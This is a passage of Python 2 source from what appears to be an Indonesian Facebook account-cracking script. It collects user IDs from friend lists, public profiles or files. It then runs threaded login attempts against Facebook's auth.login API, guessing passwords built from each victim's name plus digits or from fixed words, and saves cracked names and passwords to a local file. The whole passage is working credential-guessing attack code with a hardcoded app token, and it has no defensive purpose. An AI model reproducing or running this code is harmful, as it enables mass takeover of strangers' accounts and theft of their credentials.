                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Sayang786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_malay():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo10
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack Dari daftar Teman'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack Dari Daftar Teman Publik'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_malay()


def pilih_malay():
    teak = raw_input('\x1b[1;91mPilih Mana Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
        pilih_malay()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo17
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo17
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik / Teman Tidak Ada !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo17
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mName File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mKeluar \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada !'
                    raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                    crack_malay()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
                pilih_malay()
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Tekan CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCraker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
